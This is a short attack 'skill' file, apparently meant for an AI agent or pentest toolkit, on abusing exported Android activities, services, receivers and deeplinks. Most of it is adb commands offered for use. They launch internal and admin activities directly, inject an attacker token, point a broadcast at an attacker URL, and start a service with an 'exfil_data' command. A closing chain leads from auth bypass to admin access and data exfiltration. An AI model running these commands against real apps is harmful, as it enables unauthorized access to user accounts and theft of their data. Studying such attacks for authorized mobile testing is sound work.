# SKILL: Android Intent Attacks
## Version: 1.0 | Domain: mobile

---

## IDENTITY
Exported activities/services/receivers accept Intents from any app. Malicious app sends crafted Intent → auth bypass, data leak, action execution.

## EXPLOITATION
```bash
# Launch exported activity directly
adb shell am start -n com.target.app/.InternalActivity
adb shell am start -n com.target.app/.AdminActivity --es "token" "attacker_token"

# Send broadcast to exported receiver
adb shell am broadcast -a com.target.app.ACTION_UPDATE --es "url" "http://attacker.tld"

# Start exported service
adb shell am startservice -n com.target.app/.BackgroundService --es "command" "exfil_data"

# deeplink via intent
adb shell am start -a android.intent.action.VIEW -d "target://login?token=attacker_token"
```

## CHAIN POTENTIAL
Intent → skip auth → access admin functionality → data exfil.

## REFERENCES
OWASP MASTG, drozer docs
